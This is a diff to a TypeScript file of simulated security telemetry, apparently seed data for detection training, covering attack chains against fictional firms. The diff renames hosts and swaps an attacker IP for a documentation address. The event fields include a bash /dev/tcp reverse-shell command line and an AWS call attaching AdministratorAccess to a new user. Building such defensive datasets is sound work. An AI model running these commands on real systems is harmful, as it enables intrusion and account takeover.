@@ -2936,7 +2936,7 @@ const NEXACORP_ATTACKS: TelemetryEvent[] = [
       "data.office365.MessageSizeBytes": "4210",
       "email.from.address": "ceo@nexacorp.com",
       "email.to.address": "finance@nexacorp.com",
-      "email.subject": "URGENT: Wire transfer — please action immediately",
+      "email.subject": "URGENT: Wire transfer, please action immediately",
       "email.spf": "pass",
       "email.dkim": "pass",
       "email.dmarc": "pass",
@@ -2973,16 +2973,16 @@ const NEXACORP_ATTACKS: TelemetryEvent[] = [
   },
   {
     id: "nx_c2", ts: "2026-05-10T14:18:00.000Z", source: "edr", event_type: "file_create",
-    severity: "medium", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-NX-M.EDWARDS", src_ip: "10.20.1.55",
-    description: "m.edwards copied 18 deal model files to USB E:\\ on LAPTOP-NX-M.EDWARDS",
+    severity: "medium", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-FIN-0417", src_ip: "10.20.1.55",
+    description: "m.edwards copied 18 deal model files to USB E:\\ on LAPTOP-FIN-0417",
     mitre_technique: "T1052.001",
     file: { path: "E:\\DealModels\\DealModel_ProjectAlpha.xlsx", sha256: "fc5fe4cd910395903aa0fdc4cec74ee48c5e81c57f50182f76d778f3418e2c24" },
     raw: { "DeviceName": "laptop-nx-m.edwards", "DeviceId": "b91c4de2a7f0451c9d3e6f2a1b8c0d4e5f6a7b8c", "ActionType": "FileCreated", "FileName": "DealModel_ProjectAlpha.xlsx", "FolderPath": "E:\\DealModels\\DealModel_ProjectAlpha.xlsx", "SHA256": "fc5fe4cd910395903aa0fdc4cec74ee48c5e81c57f50182f76d778f3418e2c24", "InitiatingProcessFileName": "explorer.exe", "mde.AdditionalFields": "{\"DriveLetter\":\"E:\",\"SerialNumber\":\"4F3A-11B2\"}", "action_result": "allowed" }
   },
   {
     id: "nx_c3", ts: "2026-05-10T14:25:00.000Z", source: "edr", event_type: "net_connection",
-    severity: "high", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-NX-M.EDWARDS", src_ip: "10.20.1.55", dst_ip: "104.18.32.7", dst_port: 443,
-    description: "22 MB outbound transfer from LAPTOP-NX-M.EDWARDS to transfernow.net (104.18.32.7:443) by chrome.exe",
+    severity: "high", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-FIN-0417", src_ip: "10.20.1.55", dst_ip: "104.18.32.7", dst_port: 443,
+    description: "22 MB outbound transfer from LAPTOP-FIN-0417 to transfernow.net (104.18.32.7:443) by chrome.exe",
     mitre_technique: "T1048",
     network: { domain: "transfernow.net", bytes_out: 23_068_672 },
     raw: { "DeviceName": "laptop-nx-m.edwards", "DeviceId": "b91c4de2a7f0451c9d3e6f2a1b8c0d4e5f6a7b8c", "ActionType": "ConnectionSuccess", "InitiatingProcessFileName": "chrome.exe", "RemoteIP": "104.18.32.7", "RemotePort": "443", "RemoteUrl": "transfernow.net", "mde.AlertTitle": "Outbound data transfer to a file-sharing service", "mde.IncidentId": "637000001111", "action_result": "allowed" }
@@ -3450,27 +3450,27 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     network: { domain: "cdn-update-rs.io" },
     description: "LAP-003 queried cdn-update-rs.io three minutes after the npm post-install script ran",
     mitre_technique: "T1071.001",
-    raw: { "dns.question.name": "cdn-update-rs.io", "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.answers.data": "104.248.93.41", "dns.answers.ttl": "120", "action_result": "allowed" }
+    raw: { "dns.question.name": "cdn-update-rs.io", "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.answers.data": "203.0.113.41", "dns.answers.ttl": "120", "action_result": "allowed" }
   },
   {
     id: "rs_b3", ts: "2026-05-10T08:52:00.000Z", source: "edr", event_type: "net_connection",
-    severity: "high", vendor: "CrowdStrike Falcon", hostname: "LAP-003", src_ip: "172.16.10.3", dst_ip: "104.248.93.41", dst_port: 4444,
-    description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 104.248.93.41:4444",
+    severity: "high", vendor: "CrowdStrike Falcon", hostname: "LAP-003", src_ip: "172.16.10.3", dst_ip: "203.0.113.41", dst_port: 4444,
+    description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 203.0.113.41:4444",
     mitre_technique: "T1059.004",
-    process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", hash: { sha256: "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584" } },
-    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentBaseFileName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
+    process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/203.0.113.41/4444 0>&1", hash: { sha256: "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584" } },
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/203.0.113.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentBaseFileName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
   },
-  chainAlert({ id: "rs_b3b", ts: "2026-05-10T08:52:20.000Z", name: "Reverse Shell", product: "CrowdStrike Falcon", severity: "High", mitre: "T1059.004", host: "LAP-003", props: {"Process": "bash", "Parent Process": "node", "Remote Address": "104.248.93.41:4444"}, description: "Sentinel received the CrowdStrike Falcon detection \"Reverse Shell\" (High) on LAP-003: bash under node, remote address 104.248.93.41:4444." }),
+  chainAlert({ id: "rs_b3b", ts: "2026-05-10T08:52:20.000Z", name: "Reverse Shell", product: "CrowdStrike Falcon", severity: "High", mitre: "T1059.004", host: "LAP-003", props: {"Process": "bash", "Parent Process": "node", "Remote Address": "203.0.113.41:4444"}, description: "Sentinel received the CrowdStrike Falcon detection \"Reverse Shell\" (High) on LAP-003: bash under node, remote address 203.0.113.41:4444." }),
   {
     // Note: kept as ONE CloudTrail record (AttachUserPolicy) — a real CloudTrail
     // event is always a single API call, never a "CreateUser,AttachUserPolicy"
     // composite; the preceding CreateUser call by the same actor/session is
     // referenced in the description as context, not fabricated as a raw field.
     id: "rs_b4", ts: "2026-05-10T09:01:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
-    severity: "critical", vendor: "AWS CloudTrail", user_email: "s.amir@rocketstack.io", src_ip: "104.248.93.41",
+    severity: "critical", vendor: "AWS CloudTrail", user_email: "s.amir@rocketstack.io", src_ip: "203.0.113.41",
     description: "s.amir credentials attached AdministratorAccess to svc-backup-01, an IAM user the same session had just created",
     mitre_technique: "T1098",
-    raw: { "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.eventName": "AttachUserPolicy", "aws.cloudtrail.requestParameters.userName": "svc-backup-01", "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "aws.cloudtrail.sourceIPAddress": "104.248.93.41", "action_result": "allowed" }
+    raw: { "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.eventName": "AttachUserPolicy", "aws.cloudtrail.requestParameters.userName": "svc-backup-01", "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "aws.cloudtrail.sourceIPAddress": "203.0.113.41", "action_result": "allowed" }
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
